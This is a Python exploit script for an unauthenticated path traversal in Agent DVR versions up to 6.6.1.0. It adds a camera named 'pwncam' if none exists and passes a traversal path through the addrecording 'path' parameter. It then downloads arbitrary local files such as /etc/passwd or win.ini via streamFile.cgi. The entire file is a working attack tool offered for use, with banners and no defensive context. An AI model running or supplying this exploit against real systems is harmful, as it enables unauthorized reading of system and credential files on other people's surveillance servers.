import requests
import argparse
import json
import os


def print_banner():
    banner = r"""
    ____              __    __        ___                    __
   / __ \____  __  __/ /_  / /__     /   | ____ ____  ____  / /_
  / / / / __ \/ / / / __ \/ / _ \   / /| |/ __ `/ _ \/ __ \/ __/
 / /_/ / /_/ / /_/ / /_/ / /  __/  / ___ / /_/ /  __/ / / / /_
/_____/\____/\__,_/_.___/_/\___/  /_/  |_\__, /\___/_/ /_/\__/
                                        /____/

               Path Traversal in Agent DVR

"""
    print(banner)

def print_goodbye():
    goodbye = r"""
   __ __                                         __     __
  / // /__ __  _____   ___ _  ___ ____  ___  ___/ / ___/ /__ ___ __
 / _  / _ `/ |/ / -_) / _ `/ / _ `/ _ \/ _ \/ _  / / _  / _ `/ // /
/_//_/\_,_/|___/\__/  \_,_/  \_, /\___/\___/\_,_/  \_,_/\_,_/\_, /
                            /___/                           /___/
    """
    print(goodbye)

def parse_args():
    p = argparse.ArgumentParser(description="Exploits unauthenticated path traversal in Agent DVR versions <= 6.6.1.0 to return local files")
    p.add_argument("--target", required=True, help="Target hostname or IP (I.E. http://192.168.X.X)")
    p.add_argument("--port", required=False, default=8090, type=int, help="Target Port (default 8090)")
    p.add_argument("--file", required=True, type=str, help="File to return (I.E /etc/passwd or \"C:\\Windows\\win.ini\")")
    p.add_argument("--os", required=False, choices=["windows","linux"], default="linux", help="Target operating system (default linux)")
    return p.parse_args()

def add_camera(url):
    print("No cameras detected. Adding camera...\n")
    endpoint = url + "/command/addCamera?name=pwncam"
    response = requests.get(endpoint)
    data = json.loads(response.text)
    return data

def get_file(url, args, camera_oid, camera_ot):
    filename = "pwned"

    root, ext = os.path.splitext(args.file)
    filename = filename + ext
    endpoint = url + "/streamFile.cgi?oid={}&ot={}&fn={}"
    endpoint = endpoint.format(camera_oid, camera_ot, filename)
    try:
        response = requests.get(endpoint)
        print("File contents of " + args.file + ":\n")
        print(response.text)
        if args.os == "windows":
            print("Agent DVR will restart soon. Please wait for it to come back before running this script again.\n")
    except Exception as e:
        print("Agent DVR responded with an error. Please try again.\n")
        if args.os == "linux":
            print("Try waiting longer after Agent DVR resets to continue.\n")

def add_recording(url, args, camera_oid, camera_ot):
    # URL to add recording to camera. 'path' parameter is vulnerable to path traversal
    endpoint = url + "/command/addrecording?oid={}&ot={}&path={}&name=pwned"
    endpoint = endpoint.format(camera_oid, camera_ot, args.file)
    try:
        result = requests.get(endpoint)
    except Exception as e:
        # Agent DVR wasn't found
        print("Agent DVR service not found. Double check target and port")
        return
    # The specified file doesn't exist
    if result.text == "":
        print("File not found. Try a different file name.")
        return

    data = json.loads(result.text)
    # A camera hasn't been added to Agent DVR yet.
    if "error" in data and data["error"] == "Device not found":
        if camera_oid == 1 and camera_ot == 2:
            # Add new camera if none found
            new_camera_data = add_camera(url)
            return add_recording(url, args, new_camera_data["oid"], new_camera_data["ot"])
        else:
            print("Error finding cameras in Agent DVR. This exploit only works with cameras")

    # recording was successfully added to camera
    elif "status" in data and data["status"] == "ok":
        if args.os == "linux":
            # Linux (Ubuntu) tends to restart Agent DVR sevice at this point. Not sure why, just wait until it is done
            input("File was found! Agent DVR might restart now. Press Enter once it is back up.\n")
        else:
            # Windows still resets Agent DVR, but it takes much longer to do so
            print("File was found!\n")
        get_file(url, args, camera_oid, camera_ot)

def main():
    print_banner()
    args = parse_args()
    url = args.target + ":" + str(args.port)
    add_recording(url, args, 1, 2)
    print_goodbye()

if __name__ == "__main__":
    main()
